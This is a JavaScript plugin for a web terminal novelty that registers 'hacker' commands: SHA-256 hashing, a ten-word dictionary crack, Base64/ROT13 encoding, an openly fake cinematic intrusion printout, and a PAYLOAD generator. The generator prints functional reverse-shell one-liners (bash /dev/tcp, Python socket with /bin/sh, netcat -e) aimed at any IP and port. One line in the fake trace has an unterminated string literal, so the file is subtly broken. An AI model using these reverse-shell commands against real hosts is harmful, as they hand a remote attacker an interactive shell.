(function () {
  'use strict';
  const T = Terminal;

  // Helper for SHA-256
  async function sha256(text) {
    const buf = new TextEncoder().encode(text);
    const hash = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
  }

  // Fake cinematic hacking sequence
  async function cinematicTrace(session, target) {
    const lines = [
      `[*] Initializing connection to ${target}...`,
      `[*] Resolving DNS... Found IP: 192.168.1.104`,
      `[*] Bypassing firewall (Port 22, 80, 443)...`,
      `[*] Injecting payload...`,
      `[+] Access Granted. Root shell obtained.`
    ];

    for (const line of lines) {
      await new Promise(r => setTimeout(r, 800)); // Delay for cinematic effect
      if (line.startsWith('[+])) session.printSuccess(line);
      else session.printSystem(line);
    }
  }

  T.registerExtension({
    name: 'hacker',
    info: 'Cyber Security Suite loaded.',
    descriptions: {
      HASH: 'Generate SHA-256 hash of a text (hacker.HASH text)',
      CRACK: 'Attempt to crack a SHA-256 hash using a dictionary (hacker.CRACK hash)',
      CIPHER: 'Encode text to Base64 and ROT13 (hacker.CIPHER text)',
      TRACE: 'Run a fake cinematic hacking trace (hacker.TRACE ip)',
      PAYLOAD: 'Generate a reverse shell payload (hacker.PAYLOAD ip port)'
    },
    commands: {
      HASH: async function (arg) {
        if (!arg) return this.printError('Usage: hacker.HASH <text>');
        const hash = await sha256(arg);
        this.printSystem(`Plaintext: ${arg}`);
        this.printSuccess(`SHA-256:   ${hash}`);
      },

      CRACK: async function (arg) {
        if (!arg) return this.printError('Usage: hacker.CRACK <sha256_hash>');
        
        this.printSystem(`Target Hash: ${arg}`);
        this.printSystem(`Initiating dictionary attack... (Please wait)`);
        
        // Built-in mini dictionary
        const dictionary = ['admin', 'password', '123456', 'root', 'hacker', 'secret', 'gojo', 'kalma', 'qwerty', 'letmein'];
        
        for (let word of dictionary) {
          await new Promise(r => setTimeout(r, 100)); // Small delay to simulate processing
          const hash = await sha256(word);
          if (hash === arg.toLowerCase()) {
            return this.printSuccess(`CRACKED! The password is: ${word}`);
          }
        }
        this.printError(`FAILED. Password not found in dictionary.`);
      },

      CIPHER: function (arg) {
        if (!arg) return this.printError('Usage: hacker.CIPHER <text>');
        
        // Base64 Encode
        const b64 = btoa(arg);
        
        // ROT13
        const rot13 = arg.replace(/[a-zA-Z]/g, function(c) {
          return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
        });

        this.printSystem(`Original: ${arg}`);
        this.printSystem(`Base64:   ${b64}`);
        this.printSuccess(`ROT13:    ${rot13}`);
      },

      TRACE: async function (arg) {
        const target = arg || '127.0.0.1';
        this.printSystem(`Starting trace route to ${target}...\n`);
        await cinematicTrace(this, target);
      },

      PAYLOAD: function (arg) {
        const parts = arg.trim().split(/\s+/);
        const ip = parts[0] || '10.0.0.1';
        const port = parts[1] || '4444';

        this.printSystem(`[ Generated Payloads for ${ip}:${port} ]\n`);
        
        this.printSystem('[ Bash (Linux) ]');
        this.printSystem(`bash -i >& /dev/tcp/${ip}/${port} 0>&1\n`);

        this.printSystem('[ Python ]');
        this.printSystem(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n`);
        
        this.printSystem('[ Netcat ]');
        this.printSystem(`nc -e /bin/sh ${ip} ${port}\n`);
      }
    }
  });
})();